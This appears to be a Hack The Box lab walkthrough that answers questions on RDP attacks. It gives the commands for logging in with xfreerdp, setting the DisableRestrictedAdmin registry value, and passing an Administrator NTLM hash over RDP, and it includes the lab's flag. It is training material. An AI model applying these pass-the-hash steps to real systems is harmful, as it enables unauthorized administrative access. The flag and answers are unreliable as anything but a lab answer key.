# RDP

### What is the name of the file that was left on the Desktop? (Format example: filename.txt)

```bash
xfreerdp /v:10.129.203.13 /u:htb-rdp /p:'HTBRocks!' /cert-ignore /dynamic-resolution
pentest-notes.txt
#We found a hash from another machine Administrator account, we tried the hash in this computer but it didn't work, it doesn't have SMB or WinRM open, RDP Pass the Hash is not working.
#User: Administrator
#Hash: 0E14B9D6330BF16C30B1924111104824
```

pentest-notes.txt

### Which registry key needs to be changed to allow Pass-the-Hash with the RDP protocol?

This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG\_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`. It can be done using the following command:

```powershell
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

DisableRestrictedAdmin

### Connect via RDP with the Administrator account and submit the flag.txt as you answer.

```bash
#first lets disable restricted admin
#in cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
#then lets rdp with administrator hash
xfreerdp /v:10.129.203.13 /u:Administrator /pth:'0E14B9D6330BF16C30B1924111104824' /cert-ignore /dynamic-resolution
HTB{RDP_P4$$_Th3_H4$#}
```

HTB{RDP\_P4\$$\_Th3\_H4$#}
